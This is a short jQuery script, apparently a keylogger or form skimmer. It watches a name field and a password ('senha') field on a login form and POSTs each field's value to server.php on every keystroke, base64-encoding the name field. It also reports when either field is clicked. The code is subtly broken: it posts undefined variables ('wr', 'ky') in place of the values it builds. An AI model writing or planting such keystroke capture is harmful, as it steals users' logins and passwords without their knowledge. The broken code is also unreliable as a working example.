$(document).ready(function(){
    var nome = $('input[name=nome]');
    var senha = $('input[name=senha]');

    nome.click(function(){
        let warning;
        warning = btoa('Input Selected');
        setTimeout(() => {
            $.ajax({
                type: 'POST',
                url: 'server.php',
                data: wr
            })
        })
    })

    nome.keyup(function(){
        let key;
        key = btoa(nome.val());
        setTimeout(() => {
            $.ajax({
                type: 'POST',
                url: 'server.php',
                data: ky
            })
        }, 200);
    })

    senha.click(function(){
        let warning;
        warning = 'Input Selected';
        setTimeout(() => {
            $.ajax({
                type: 'POST',
                url: 'server.php',
                data: wr
            })
        })
    })

    senha.keyup(function(){
        let key;
        key = senha.val();
        setTimeout(() => {
            $.ajax({
                type: 'POST',
                url: 'server.php',
                data: ky
            })
        }, 200)
    })
    
});